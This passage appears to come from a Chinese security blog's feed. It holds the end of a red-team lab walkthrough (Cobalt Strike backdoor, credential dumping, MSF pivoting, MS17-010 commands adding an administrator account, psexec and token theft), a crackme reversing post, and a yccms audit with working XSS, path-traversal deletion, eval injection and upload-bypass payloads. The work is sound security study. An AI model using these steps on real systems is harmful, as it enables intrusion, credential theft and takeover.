src="https://api2.mubu.com/v3/document_image/59de277b-f641-4f8e-847d-69f903b282ab-11763069.jpg" alt="img"></p></li><li><p>打开cs  生成一个后门<img src="https://api2.mubu.com/v3/document_image/7a6004da-af1d-4acf-aabc-024e545c7f66-11763069.jpg" alt="img"></p></li><li><p>然后将它传上去   <img src="https://api2.mubu.com/v3/document_image/ed745ad7-ee29-42ab-a275-90240a5bfa97-11763069.jpg" alt="img"></p></li><li><p>然后执行上线<img src="https://api2.mubu.com/v3/document_image/f3ebeb09-d149-4a1c-9195-95a68598723d-11763069.jpg" alt="img"></p></li><li><p>上线之后 第一步 还是先把延时设置为0<img src="https://api2.mubu.com/v3/document_image/44e63cae-0534-4579-bf32-a9c0a07ffd0e-11763069.jpg" alt="img"></p></li><li><p>然后就可以直接用cs 进行目标的信息收集  例如收集目标打的补丁<img src="https://api2.mubu.com/v3/document_image/b921bdd5-72b1-4c00-ab9c-fb28c621b123-11763069.jpg" alt="img"></p></li><li><p>打了4个补丁  然后就可以随便上exp打 就行了</p></li><li><p>抓取密码   直接发现是明文密码<img src="https://api2.mubu.com/v3/document_image/b34f3131-1c07-4802-a2c4-d64322398d9f-11763069.jpg" alt="img"></p></li><li><p>logonpasswords #拖取明文密码与NMTL票据              </p></li><li><p>NTLM  也可以直接去md5解密<img src="https://api2.mubu.com/v3/document_image/2883c5f0-1d89-4df7-94e9-ce41ee9f279c-11763069.jpg" alt="img"></p></li><li><p>又因为是administrator权限 可以直接创建用户 然后直接用cs 开启3389  <img src="https://api2.mubu.com/v3/document_image/1083ea47-fc3d-4489-a0d5-0ba4f1a1942e-11763069.jpg" alt="img"></p></li><li><p>然后进行连接  可以直接连接<img src="https://api2.mubu.com/v3/document_image/50e6285d-23e8-4eeb-9ac7-b7b23ba02c33-11763069.jpg" alt="img"></p></li><li><p>另外 也可以通过msf 联动配合   cs和msf联动的时候  cs需要新建一个监听器<img src="https://api2.mubu.com/v3/document_image/2d4dea48-eeba-445e-b62b-2fcad49b9d80-11763069.jpg" alt="img"></p></li><li><p>然后设置msf<img src="https://api2.mubu.com/v3/document_image/dc82f881-261f-4e87-b6f9-d23eb61ce0bf-11763069.jpg" alt="img"></p></li><li><p>这里是重点 需要用http才行</p></li><li><p>然后用cs新建会话  选择设置的MSF监听器<img src="https://api2.mubu.com/v3/document_image/aadd83b3-fa03-4405-9437-637a7b599add-11763069.jpg" alt="img"></p></li><li><p>然后msf这边会话就弹回来了<img src="https://api2.mubu.com/v3/document_image/bb11c633-d62a-43d6-8b06-1e9f28e7f689-11763069.jpg" alt="img"></p></li><li><p>然后用msf自带的模块 直接提升为system权限  命令  getsystem<img src="https://api2.mubu.com/v3/document_image/2bcc9ed2-f30b-4f97-81e3-b659bf0926f5-11763069.jpg" alt="img"></p></li><li><p>还是先通过arp -a  查看一下网段情况  发现还有 两台机器<img src="https://api2.mubu.com/v3/document_image/339024c8-c94c-4c52-8f4f-7769eba83f75-11763069.jpg" alt="img"></p></li><li><p>因为那两台是存在内网的  所以之后的操作 就需要先设置路由来操作</p></li><li><p>设置路由 命令 run autoroute -s 192.168.52.0/24<img src="https://api2.mubu.com/v3/document_image/458853d2-d404-4686-9ed3-16465f20167a-11763069.jpg" alt="img"></p></li><li><p>然后查看路由添加情况 命令 run autoroute -p<img src="https://api2.mubu.com/v3/document_image/b058d8ac-6c2f-4f6c-a6b2-038433658370-11763069.jpg" alt="img"></p></li><li><p>用模块扫描一下存活的主机 命令 run post/windows/gather/arp_scanner rhosts=192.168.52.0/24</p><ul><li>143 是web服务器的  已经被拿下</li></ul></li><li><p>接下来就是拿下另外两台  先将会话挂起 然后就需要进行socks代理 拿下另外两台</p></li><li><p>命令 use auxiliary/server/socks_proxy <img src="https://api2.mubu.com/v3/document_image/9648065f-048b-4b67-a85d-60557e35906b-11763069.jpg" alt="img"></p></li><li><p>配置相关设置<img src="https://api2.mubu.com/v3/document_image/246c6cb4-c913-4bb8-9f94-948f73259d63-11763069.jpg" alt="img"></p></li><li><p>然后查看配置文件是否一致 命令 vim /etc/proxychains4.conf <img src="https://api2.mubu.com/v3/document_image/509197c8-7ffe-4d57-8e1f-cdff5897190d-11763069.jpg" alt="img"></p></li><li><p>然后 扫描端口 proxychains nmap -sT -Pn -T4 192.168.52.141</p></li><li><p>这里也可以通过cs自带的portscan模块  端口扫描 进行端口探测<img src="https://api2.mubu.com/v3/document_image/500814ec-c5fd-471c-9246-0ce1150e533d-11763069.jpg" alt="img"></p></li><li><p>然后发现都打开了445端口  这里就推测有有m17010  但是发现利用失败  换一种m17010的使用方法  添加账户的方法</p></li><li><p>命令 use auxiliary/admin/smb/ms17_010_command <img src="https://api2.mubu.com/v3/document_image/208162fb-baad-4a87-ad3b-ec2ba13d5d0c-11763069.jpg" alt="img"></p></li><li><p><img src="https://api2.mubu.com/v3/document_image/f9d56611-aa1c-4599-acd6-6a71ec80bcdf-11763069.jpg" alt="img"></p></li><li><p>然后设置相关配置  设置添加的账户和密码  密码需要复杂点 不然 过不了规则<img src="https://api2.mubu.com/v3/document_image/f91a5942-ceb1-42a9-b6f3-940c9b6a99f1-11763069.jpg" alt="img"></p></li><li><p>然后将创建的用户 添加到管理组 命令  set COMMAND net localgroup administrators hack /add<img src="https://api2.mubu.com/v3/document_image/fa1d9156-5df2-475a-bc64-8c1f365d81aa-11763069.jpg" alt="img"></p></li><li><p><img src="https://api2.mubu.com/v3/document_image/37b6b0de-43ed-4980-896a-d0ef52633712-11763069.jpg" alt="img"></p></li><li><p>域成员拿下</p></li><li><p>域控</p></li><li><p>开始进行对域控的渗透  上面利用cs对端口进行了扫描  打开了445 端口 直接用msf的模块测试</p></li><li><p>命令：use auxiliary/scanner/smb/smb_ms17_010</p></li><li><p> msf6 auxiliary(scanner/smb/smb_ms17_010) &gt;  set rhost 192.168.52.138<img src="https://api2.mubu.com/v3/document_image/2e20d943-81da-41f8-901b-bed142768443-11763069.jpg" alt="img"></p></li><li><p>直接开打</p></li><li><p>利用搜索模块 命令 search ms17_010<img src="https://api2.mubu.com/v3/document_image/1a3079bc-f715-445d-b399-fa3a4ce2f35a-11763069.jpg" alt="img"></p></li><li><p>我们用第一个</p></li><li><p>命令：use auxiliary/admin/smb/ms17_010_command </p></li><li><p>然后将创建的用户 添加到管理组 命令  set COMMAND net user hack1 bhanquan@2021 /add</p></li><li><p>然后exploit开打<img src="https://api2.mubu.com/v3/document_image/c75a4383-1e3a-46a3-a7c4-b218b6b31c7d-11763069.jpg" alt="img"></p></li><li><p>然后将 用户添加到管理组 命令 ：set COMMAND net localgroup administrators hack /add</p></li><li><p>然后exploit</p></li><li><p>然后查看添加是否成功 命令set COMMAND net localgroup administrators<img src="https://api2.mubu.com/v3/document_image/f8044348-e749-442e-97a4-ee145d3ca4d2-11763069.jpg" alt="img"></p></li><li><p>添加成功</p></li></ul></li><li><p>另外操作(不太熟练 有点懵)</p><ul><li><p>在上面已经通过cs抓到了 域管的密码   和通过msf 用ms17 010 创建了账户</p></li><li><p>然后用cs  的  SMB Beacon操作</p><ul><li>SMB Beacon 使用命名管道通过父级 Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 从父 Beacon 获取到任务并发送。因为链接的 Beacons 使用 Windows 命名管道进行通信，此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽，绕防火墙时可能发挥奇效</li></ul></li><li><p>在已有的 beacon 上创建监听，用来作为跳板进行内网穿透</p></li><li><p>前提是能够通过 shell 之类访问到内网其他主机</p></li><li><p>psexec 使用凭证登录其他主机</p></li><li><p>前面横向探测已经获取到内网内的其他 Targets 以及读取到的凭证信息</p></li><li><p>于是可以尝试使用 psexec 模块登录其他主机</p></li><li><p>右键选择一台非域控主机 ROOT-TVI862UBEH 的 psexec 模块：<img src="https://api2.mubu.com/v3/document_image/d0d29ddd-99e7-4e74-b517-d20c989b4a76-11763069.jpg" alt="img"></p></li><li><p>在弹出的窗口中选择使用 god.org 的 Administrator 的凭证信息</p></li><li><p>监听器选择刚才创建的 smb beacon，会话也选择对应的 smb beacon 的会话：<img src="https://api2.mubu.com/v3/document_image/50f3ab12-a09b-4c06-a877-8f24c827ec3d-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/4e576afb-7928-46ff-926c-e9bd456cb772-11763069.jpg" alt="img"></p></li><li><p>执行后效果如下：<img src="https://api2.mubu.com/v3/document_image/175adf88-e1fb-4e9e-960e-a4d251a441eb-11763069.jpg" alt="img"></p></li><li><p>之后的OWA 也是相同的办法</p></li><li><p>最终的图示图<img src="https://api2.mubu.com/v3/document_image/ecadb6f6-6a53-4fc7-a45e-251c8c041646-11763069.jpg" alt="img"></p></li><li><p>toke窃取</p><ul><li><p>除了直接使用获取到的 hash 值，也可以直接窃取 GOD\Administrator 的 token 来登录其他主机</p></li><li><p>选择 beacon 右键 -&gt; 目标 -&gt; 进程列表</p></li><li><p>选择 GOD\Administrator 的 token 盗取：<img src="https://api2.mubu.com/v3/document_image/25f073c7-3474-4b81-ae0a-14ea3f181a69-11763069.jpg" alt="img"></p></li><li><p>然后在选择令牌处勾选使用当前 token 即可：<img src="https://api2.mubu.com/v3/document_image/5f59abac-ac17-421a-95eb-cacebdf49cf7-11763069.jpg" alt="img"></p></li><li><p>效果和前面是一样的</p></li><li><p>之后就可以开3389 什么的 进行远程连接</p></li></ul></li></ul></li></ul></li><li><p>参考：<a href="https://soapffz.com/sec/558.html#menu_index_15">https://soapffz.com/sec/558.html#menu_index_15</a></p></li><li><p>参考：<a href="https://www.cooyf.com/bj/vulnstack1.html#toc_8">https://www.cooyf.com/bj/vulnstack1.html#toc_8</a></p><ul><li><p><a href="https://www.freebuf.com/column/231111.html">https://www.freebuf.com/column/231111.html</a></p></li><li><p><a href="https://www.hacksafe.net/articles/web/4463.html">https://www.hacksafe.net/articles/web/4463.html</a></p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单逆向分析1</title>
    <link href="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/"/>
    <url>/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/</url>
    
    <content type="html"><![CDATA[<blockquote><p>程序效果</p></blockquote><blockquote><p>输入一串字符串  然后输出key right或者error</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/1.png" alt="1"></p><blockquote><p>内部肯定是进行了判断  因为这里打印了 字符 我们可以直接通过这些关键词 来搜寻到 函数的入口</p></blockquote><blockquote><p>在od里面</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/2.png" alt="2"></p><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/3.png" alt="3"></p><blockquote><p>然后回车进去</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/4.png" alt="4"></p><p>看到error了  也看到right了  那应该是找对了  然后往上翻 找到函数的入口  F2打上断点  执行到这</p><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/5.png" alt="5"></p><blockquote><p>初步分析   这里定义了5个局部变量</p></blockquote><blockquote><p>然后add esp在call后面  这应该就是外平栈   cdecl   push传参</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/6.png" alt="6"></p><blockquote><p>然后看下面这个call    push了2次  然后在call的后面 外平栈 0x8 那应该是 只传了这两个参数</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/7.png" alt="7"></p><blockquote><p>然后继续F8运行  但运行到call  走不动了   然后程序提示输入   那这个函数应该就是获取输入的值</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/8.png" alt="8"></p><blockquote><p>但是通过这里可以发现  是将第一个局部变量的地址传了进去    但前面又是赋值的0 是int型   输入的又是字符串型 对不上啊  前面的5个局部变量又是地址挨着的   那可以猜测 不是5个局部int变量    而是一个char类型的数组   然后将首地址传了进去  这样就对得上了</p></blockquote><blockquote><p>然后在程序框输入123456  然后执行</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/9.png" alt="9"></p><blockquote><p>可以发现 函数执行后  又将数组的第一个地址给了edx   然后push到了 下一个call   因为在call后面是add esp，0x4   那应该就只传了一个参数  就是push的edx</p></blockquote><blockquote><p>后面的这一个函数我们先不跟进  就先直接执行  然后看看寄存器值的变化</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/10.png" alt="10"></p><blockquote><p>发现eax变成了0  因为一般eax是函数的返回值 但也不一定    然后看后面  又用到了eax   那大概率就是返回值了 </p></blockquote><blockquote><p>然后看后面cmp 又和0比较  然后je跳转   直接跳到了error  那如果要返回正确 就要eax返回的值不是0 是其他的或者1</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/11.png" alt="11"></p><blockquote><p>je 主要是根据ZF标志寄存器来判断的只要ZF不为1就行  或者直接将je 用 nop填充 也直接执行right</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/12.png" alt="12"></p><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/13.png" alt="13"></p><blockquote><p>但是这样没有拿到 正确的key  为了拿到正确的key  我们跟进那个判断的函数</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/14.png" alt="14"></p><blockquote><p>发现这个函数push了两个值  一个hello51hook 还有一个从地址取出存到eax里面</p></blockquote><blockquote><p>ebp+8  就是我们输入的值   也就是函数传参的第一个参数</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/15.png" alt="15"></p><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/16.png" alt="16"></p><blockquote><p>通过add esp 0x8  也可以判断出 这个call  接收了2个参数</p></blockquote><blockquote><p>然后执行完call 发现eax变成的FFFFFFFF  也就是-1</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/17.png" alt="17"></p><blockquote><p>然后看后边 test eax eax 与运算  除了0与0 为0  其他的与本身肯定是不为0的  然后jnz跳转   FFFFFF  肯定运算出来不为0  所以是要跳转的</p></blockquote><blockquote><p>看下面  直接跳转到xor  清空eax  然后就返回0出去了</p></blockquote><blockquote><p>所以这个函数就相当于判断传入的字符串与hello51hook是否相等  相等肯定返回出去的就是1了</p></blockquote><blockquote><p>如果相等的话 ZF就会是1    会给eax  1 然后直接执行jmp跳转到下面就返回出去了</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/18.png" alt="18"></p><blockquote><p>然后现在正确的key也拿到了 就不用分析了后面   </p></blockquote>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yccms审计</title>
    <link href="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/"/>
    <url>/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p>##Yccms审计</p><p>下载源码<a href="http://ahdx.down.chinaz.com/202003/yccms_v3.4.rar">http://ahdx.down.chinaz.com/202003/yccms_v3.4.rar</a></p><blockquote><p>目录整体结构</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/1.png" alt="1"></p><blockquote><p>先打开首页</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/2.png" alt="2"></p><blockquote><p>很显然 首页没有什么内容</p></blockquote><blockquote><p>然后打开审计工具</p></blockquote><h3 id="第一处xss"><a href="#第一处xss" class="headerlink" title="第一处xss"></a>第一处xss</h3><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/3.png" alt="3"></p><blockquote><p>在第一行发现了一个xss漏洞 跟进看看</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/4.png" alt="4"></p><blockquote><p>直接echo  也没有什么过滤 通过$GET请求 获取$art参数的值 直接用echo输出</p></blockquote><blockquote><p>直接构造payload：?art=<script>alert(1)</script></p></blockquote><blockquote><p>xss测试</p></blockquote><blockquote><p>访问这个页面并添加payload</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/5.png" alt="5"></p><blockquote><p>Xss成功</p></blockquote><h3 id="第二处任意文件删除"><a href="#第二处任意文件删除" class="headerlink" title="第二处任意文件删除"></a>第二处任意文件删除</h3><blockquote><p>通过自动审计工具 发现了一个任意文件读取或删除</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/6.png" alt="6"></p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/7.png" alt="7"></p><blockquote><p>关键函数在delall函数中 我们往下分析</p></blockquote><blockquote><p>先是判断post请求中是否有send参数 然后才进入if里面</p></blockquote><blockquote><p>为好了跟进函数 换到phpstorm</p></blockquote><blockquote><p>If是通过validate类的<strong>isNullString<strong><strong>函数来判断</strong></strong>post<strong><strong>请求中的</strong></strong>pic****参数的值</strong></p></blockquote><blockquote><p><strong>我们跟进这个<strong><strong>isNullString</strong></strong>函数</strong></p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/8.png" alt="8"></p><blockquote><p>在验证类里面  <strong>isNullString<strong><strong>是为了判断</strong></strong>pic****的值是否为空</strong> <strong>空的话就返回<strong><strong>true</strong></strong>否则****false</strong></p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/9.png" alt="9"></p><blockquote><p>在根据if的逻辑来看 就是 如果pic的值是空的话 就进入if 然后执行tool类的函数 这个应该就是提示的</p></blockquote><blockquote><p>然后将路径和uploads拼接 ROOT_PATH是定义的根目录</p></blockquote><blockquote><p>打印看看</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/10.png" alt="10"></p><blockquote><p>相当于拼接后 是uploads目录下</p></blockquote><blockquote><p>继续往下看</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/11.png" alt="11"></p><p>然后通过foreach循环 将pic的值赋给 $_value 然后拼接到路径上</p><p>然后将路径放到unlink（）函数中进行删除，返回值为ture或者false然后再执行if-else语句</p><p>unlink() 函数删除文件。</p><p>但是这里没有对路径进行任何的过滤和防护 就可以构造../来跨目录删除其他文件</p><p>构造payload：pid[0]=../2.txt</p><p>文件删除测试</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/12.png" alt="12"></p><blockquote><p>来到后台 其他功能的地方</p></blockquote><blockquote><p>然后点击删除选择的图片进行抓包</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/13.png" alt="13"></p><blockquote><p>将payload加上  提前在文件夹创建好测试文件</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/14.png" alt="14"></p><blockquote><p>这是在根目录下创建好的 然后点击go</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/15.png" alt="15"></p><blockquote><p>然后查看根目录</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/16.png" alt="16"></p><blockquote><p>发现2.txt已经不见了 成功删除</p></blockquote><h3 id="第三处代码执行"><a href="#第三处代码执行" class="headerlink" title="第三处代码执行"></a>第三处代码执行</h3><blockquote><p>通过审计工具 发现一个可能代码执行的漏洞 </p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/17.png" alt="17"></p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/18.png" alt="18"></p><blockquote><p>为了方便操作 还是习惯用phpstorm 切换回来</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/19.png" alt="19"></p><blockquote><p>漏洞存在的点在这个eval函数 </p></blockquote><blockquote><p>先看看整段的逻辑</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/20.png" alt="20"></p><p>在factory类中 的setAction函数里  这个函数先通过getA 获取get请求a的值  </p><p>然后通过if判断a的值 是否为数组里面的 然后判断session是否是admin权限 进行是否跳转到登录 </p><p>但这一步 直接不进入if判断 不久跳过这个session判断了嘛</p><p>往后看</p><p>然后通过file_exits 函数判断文件是否存在  不存在则给$_a赋值login</p><p>file_exists() 函数检查文件或目录是否存在。</p><p>然后进入到eval函数执行self::$_obj = new ‘.ucfirst($_a).’Action();</p><p>ucfirst() 函数把字符串中的首字符转换为大写。</p><p>进入eval函数的内容没有经过任何过滤 又因为$_a 是通过get请求获取的 可控 就导致了 eval函数里面的内容可控 至此 导致代码执行</p><p>先找找那个文件调用了这个类</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/21.png" alt="21"></p><p>Run.inc.php这个文件实例了这个类并且调用了setAction函数</p><p>然后寻找哪个文件引用了Run.inc.php文件</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/22.png" alt="22"></p><p>Admin/index.php 和 count.php 都引用了</p><p>构造payload：?a=Factory();phpinfo();//../</p><p>先测试 后面在说说为什么这样构造</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/23.png" alt="23"></p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/24.png" alt="24"></p><p>两个文件都可以直接命令执行</p><p>说说这样构造我自己的理解 file_exits 函数在判断文件的时候</p><p>他判断的内容是：</p><p>D:/phpstudy_pro/WWW/yccms_v3.4/controller/Factory();phpinfo();//../Action.class.php</p><p>这是controller目录</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/25.png" alt="25"></p><p>判断的时候 函数将/Factory();phpinfo();/  //里面的内容当成了目录 虽然不存在 但是还是继续往后进行的判断 然后遇到../ 就回到了上一级目录controller目录 目录下又有Action.class.php这个文件 所以file_exits 能返回true 所以没有进入if</p><p>我在cmd测试也能成功切换</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/26.png" alt="26"></p><p>然后来到eval函数里面 里面相当于执行的内容是self::$_obj = new Factory();phpinfo();//../Action();</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/27.png" alt="27"></p><p>Factory() 是为了闭合前面的new  后面的// 则相当于把后面的action() 注释掉了 </p><p>所以最后phpinfo() 直接执行了</p><p>把phpinfo() 换成一句话就直接用蚁剑菜刀进行链接就行了 这里我就不做演示了</p><p>这就是我对这个洞的理解  有什么理解不对的地方望师傅们指出</p><h3 id="第四处-任意文件上传"><a href="#第四处-任意文件上传" class="headerlink" title="第四处 任意文件上传"></a>第四处 任意文件上传</h3><p>逛后台的时候发现一个logo上传</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/28.png" alt="28"></p><p>点击上传 发现打开了另一个窗口</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/29.png" alt="29"></p><p>复制url到另一个浏览器打开</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/30.png" alt="30"></p><p>不需要任何权限验证就直接打开了 只要有这个url 就可以上传文件了</p><p>尝试上传</p><p>直接尝试图片马 抓包修改后缀php</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/31.png" alt="31"></p><p>可以看到 d盘下有个logo.php</p><p>虽然报错了 打开文件夹看看</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/32.png" alt="32"></p><p>Php成功上传了 尝试打开  这里是可以不需要登录就可以上传的 只需要这个数据包或者上传文件的url</p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/33.png" alt="33"></p><blockquote><p>上传成功</p></blockquote><blockquote><p>通过报错我们找到文件进行代码分析</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/34.png" alt="34"></p><blockquote><p>在public/class/LogoUpload.class.php文件下 我们跟进logoupload类</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/35.png" alt="35"></p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/36.png" alt="36"></p><blockquote><p>可以看出只检验了Content-Type 没有检测后缀什么的  所以 图片马抓包改后缀可以直接绕过</p></blockquote><h3 id="第五处任意文件上传"><a href="#第五处任意文件上传" class="headerlink" title="第五处任意文件上传"></a>第五处任意文件上传</h3><blockquote><p>在后台的添加文章的地方 有个编辑器</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/37.png" alt="37"></p><blockquote><p>测试方法和上面一下 先上传图片马抓包</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/38.png" alt="38"></p><blockquote><p>同样直接上传成功了</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/39.png" alt="39"></p><blockquote><p>分析代码</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/40.png" alt="40"></p><blockquote><p>还是定位到这个文件public/class/LogoUpload.class.php  继续跟进fileupload</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/41.png" alt="41"></p><blockquote><p>也只进行了 type验证</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/42.png" alt="42"></p><blockquote><p>绕过方法和上面的任意上传一样 就不多赘述了</p></blockquote><blockquote><p>删掉cookie等 也是可以上传的</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/43.png" alt="43"></p><h3 id="第六处未授权修改管理员密码"><a href="#第六处未授权修改管理员密码" class="headerlink" title="第六处未授权修改管理员密码"></a>第六处未授权修改管理员密码</h3><blockquote><p>来到后台的修改密码的地方</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/44.png" alt="44"></p><blockquote><p>修改密码进行抓包</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/45.png" alt="45"></p><blockquote><p>然后分析源码</p></blockquote><blockquote><p>在adminaction.class.php中</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/46.png" alt="46"></p><blockquote><p>先判断post请求中的send</p></blockquote><blockquote><p>然后判断用户名和密码是否是空等操作 然后来到editadmin() 进行跟进</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/47.png" alt="47"></p><blockquote><p>直接执行</p></blockquote><blockquote><p>通过代码分析 都没有对是否登录 等权限进行判断 所以删除cookie还是可以直接添加</p></blockquote><blockquote><p>但是当我把cookie删完的时候包用户名为空的错误 我就不理解了</p></blockquote><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/48.png" alt="48"></p><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/49.png" alt="48"></p><blockquote><p>为什么爆这个错啊 这里就很懵</p></blockquote><blockquote><p>望师傅们指点</p></blockquote><h3 id="第七处-验证码重放"><a href="#第七处-验证码重放" class="headerlink" title="第七处 验证码重放"></a>第七处 验证码重放</h3><p><img src="/2021/10/26/yccms%E5%AE%A1%E8%AE%A1/50.png" alt="50"></p><p>后台登录错误验证码不刷新 可导致爆破 这个就不做演示了 师傅们都会</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zzcms的再一次审计</title>
    <link href="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/"/>
    <url>/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>首发 奇安信攻防社区<a href="https://forum.butian.net/share/640">https://forum.butian.net/share/640</a></p><p>在看了社区<a href="https://forum.butian.net/share/460%E5%B8%88%E5%82%85%E7%9A%84%E6%96%87%E7%AB%A0%E5%90%8E">https://forum.butian.net/share/460师傅的文章后</a> 找师傅要到源码 然后在次对zzcms发起了审计</p></blockquote><h3 id="审计开始"><a href="#审计开始" class="headerlink" title="审计开始"></a>审计开始</h3><blockquote><p>首先打开页面</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/1.png" alt="1"></p><h3 id="第一处sql"><a href="#第一处sql" class="headerlink" title="第一处sql"></a>第一处sql</h3><p><img 